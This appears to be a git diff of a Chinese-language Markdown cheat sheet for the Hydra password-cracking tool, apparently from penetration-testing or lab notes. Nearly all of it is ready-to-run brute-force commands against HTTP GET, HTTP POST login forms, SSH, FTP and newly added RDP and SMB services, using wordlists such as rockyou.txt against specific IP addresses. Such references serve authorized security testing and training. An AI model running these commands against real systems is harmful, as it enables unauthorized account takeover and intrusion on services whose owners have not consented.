@@ -1,6 +1,10 @@
+---
+description: 暴力破解工具
+---
+
 # Hydra
 
-\[TOC]
+
 
 ```shell
 hydra -h
@@ -49,12 +53,18 @@ hydra -L ./UserNames.txt -P ./rockyou.txt -u -f 178.35.49.134 -s 32901 http-get 
 # WEB 表单暴力破解
 hydra -C ./ftp-betterdefaultpasslist.txt 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
  
- hydra -l admin -P ./rockyou.txt -f 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
+hydra -l admin -P ./rockyou.txt -f 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
  
 # SSH  攻击
 hydra -L bill.txt -P william.txt -u -f ssh://178.35.49.134:22 -t 4
 
 # FTP 攻击
 hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1
+
+# RDP 暴力破解
+hydra -L user.list -P password.list rdp://10.129.42.197
+
+# SMB 工具
+hydra -L user.list -P password.list smb://10.129.42.197
 
 ```
